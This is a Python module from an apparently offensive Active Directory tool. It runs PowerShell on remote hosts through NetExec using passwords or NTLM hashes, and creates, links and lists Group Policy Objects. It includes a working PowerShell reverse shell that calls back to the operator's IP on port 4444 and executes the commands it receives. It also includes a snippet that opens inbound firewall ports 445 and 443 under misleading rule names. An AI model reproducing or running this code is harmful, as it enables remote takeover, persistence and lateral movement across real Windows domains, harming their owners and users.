import subprocess
import argparse
import sys
import re
from typing import Optional, Dict
from colored import Fore
from ..Modules.utils import get_ip

def get_head(name: str, oppsec: Optional[bool] = True) -> str:
    my_ip = get_ip()
    ip = "8.8.8.8" if oppsec else my_ip

    exploit_heads = {
        "rev-shell": f"""
            $c = New-Object System.Net.Sockets.TCPClient('{my_ip}',4444);
            $s = $c.GetStream();
            [byte[]]$b = 0..65535|%{{0}};
            while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
                $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
                $sb = (iex $d 2>&1 | Out-String );
                $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
                $s.Write($sb,0,$sb.Length);
                $s.Flush()
            }};
            $c.Close()
            """,
        "disable-firewall": f"""
            $firewall_on = Test-Connection {ip} -Count 1 -Quiet
            if ($firewall_on){{
                New-NetFirewallRule -DisplayName "RPC Endpoint Mapper" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 445 -Description "Core RPC service" -Group "Network Discovery"
                New-NetFirewallRule -DisplayName "RPC Dynamic Ports" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 443 -Description "Inbound rule for the Remote Procedure Call service." -Group "Network Discovery"
            }}
            """,
    }   
    return exploit_heads.get(name)
    
def execute_powershell(target: str, username: str, password: str, domain: str, ps_command: str, use_hash: bool = False) -> tuple[bool,str]:
    cmd = ['nxc', 'smb', target, '-u', username, '-d', domain]
    if use_hash:
        cmd.extend(['-H', password])
    else:
        cmd.extend(['-p', password])
    cmd.extend(['-X', ps_command])

    try:
        result = subprocess.run(cmd, capture_output=True, text=True)

        output = result.stdout + result.stderr
        success = result.returncode == 0
        return success, output
    
    except Exception as e:
        return False, f"Error executing command: {str(e)}"
    
def create_gpo(target: str, username: str, password: str, domain: str, gpo_name: str, use_hash: bool = False) -> Optional[Dict[str, str]]:
    ps_command = f'''
$ErrorActionPreference = "Stop"
try {{
    Import-Module GroupPolicy
    $gpo = New-GPO -Name "{gpo_name}"

    Write-Host "Success"
    Write-Host "GPO_NAME: $($gpo.DisplayName)"
    Write-Host "GPO_ID: $($gpo.Id)"
    Write-Host "GPO_DOMAIN: $($gpo.DomainName)"
    Write-Host "GPO_PATH: $($gpo.Path)"
}} catch {{
    Write-Host "Error"
    Write-Host "ERROR_MSG: $($_.Exception.Message)"
}}
'''
    print(f"{Fore.yellow}[*] Creating GPO: {gpo_name}")
    print(f"{Fore.yellow}[*] Target: {target} ")
    print(f"{Fore.yellow}[*] Domain: {domain}\\{username}")
    print()

    success, output = execute_powershell(target, username, password, domain, ps_command, use_hash)
    if "Success" in output:
        print(f"{Fore.green}[+] GPO Created Successfully!")
        print()

        gpo_details = {}
        for line in output.split('\n'):
            if line.startswith('GPO_'):
                parts = line.split(":",1)
                if len(parts) == 2:
                    key = parts[0].replace('GPO_', '').strip()
                    value = parts[1].strip()
                    gpo_details[key] = value
                    print(f"{Fore.green} {key} {value}")
        print()
        return gpo_details

    elif "Error" in output:
        print(f"{Fore.red}[-] Failed to create GPO")
        error_match = re.search(r'ERROR_MSG: (.+)', output)
        if error_match:
            print(f"{Fore.red} Error: {error_match.group(1)}")
        return None
    else:
        print(f"{Fore.red} Something went horribly wrong when creating GPO")
        print(output)
        return None

def link_gpo(target: str, username: str, password: str, domain: str, gpo_name: str, ou_path: str, use_hash: bool = False) -> bool:
    ps_command = f'''
$ErrorActionPreference = "Stop"
try{{
    Import-Module GroupPolicy

    $link = New-GPLink -Name "{gpo_name}" -Target "{ou_path}" -LinkEnabled Yes

    Write-Host "Success"
    Write-Host "LINK_TARGET: {ou_path}"
    Write-Host "LINK_GPO: {gpo_name}"
    Write-Host "LINK_ORDER: $($link.Order)"
    Write-Host "LINK_ENABLED: $($link.Enabled)"
}} catch {{
    Write-Host "Error"
    Write-Host "ERROR_MSG: $($_.Exception.Message)"
}}
'''
    
    print(f"{Fore.yellow}[*] Linked GPO to OU")
    print(f"{Fore.yellow}[*] GPO: {gpo_name}")
    print(f"{Fore.yellow}[*] OU: {ou_path}")
    print()

    success, output = execute_powershell(target, username, password, domain, ps_command, use_hash)

    if "Success" in output:
        print(f"{Fore.green}[+] GPO Linked Successfully!")
        print()

        for line in output.split('\n'):
            if line.startswith('LINK_'):
                parts = line.split(":",1)
                if len(parts) == 2:
                    key = parts[0].replace('LINK_', '').strip()
                    value = parts[1].strip()
                    print(f"{Fore.green} {key} {value}")
        print()
        return True

    else:
        print(f"{Fore.red}[-] Failed to create GPO")
        error_match = re.search(r'ERROR_MSG: (.+)', output)
        if error_match:
            print(f"{Fore.red} Error: {error_match.group(1)}")
        return False
    
def list_gpos(target: str, username: str, password: str, domain: str, use_hash: bool = False):
    ps_command = '''
$ErrorActionPreference = "Stop"
try{
    Import-Module GroupPolicy
    $gpos = Get-GPO -All | Select-Object DisplayName, Id, CreationTime, ModificationTime

    Write-Host "GPO-List"
    foreach ($gpo in $gpos){
        Write-Host "GPO|$($gpo.DisplayName)|$($gpo.Id)|$($gpo.CreationTime)|$($gpo.ModificationTime)"
    }
} catch {
    Write-Host "ERROR: $($_.Exception.Message)"
    exit 1
}
'''
    print(f"{Fore.green}[+] Listing all GPOs...")
    print()

    success, output = execute_powershell(target, username, password, domain, ps_command, use_hash)

    if "GPO-List" in output:
        gpo_lines = [line for line in output.split('\n') if 'GPO|' in line]

        if gpo_lines:
            for line in output.splitlines():
                if 'GPO|' in line:
                    clean = line[line.index('GPO|'):]
                    parts = clean.split('|')
                    if len(parts) >= 4:
                        name = parts[1][:40]
                        gpo_id = parts[2]
                        created = parts[3]
                        print(f"{name:<40} {gpo_id:<38} {created}")

        for line in output.split('\n'):
            if line.startswith('LINK_'):
                parts = line.split(":",1)
                if len(parts) == 2:
                    key = parts[0].replace('LINK_', '').strip()
                    value = parts[1].strip()
                    print(f"{Fore.green} {key} {value}")
        print()
  
def gpoHydra(username: str, password: str, use_hash: bool, target: str, domain: str, action: str, ou: Optional[str] = None, name: Optional[str] = None) -> None:
    if action == 'create':
        gpo_details = create_gpo(target, username, password, domain, name, use_hash)
        if gpo_details and ou:
            print()
            link_gpo(target, username, password, domain, name, ou, use_hash)
    elif action == 'link':
        link_gpo(target, username, password, domain, name, ou, use_hash)
    elif action == 'list':
        list_gpos(target, username, password, domain, use_hash)

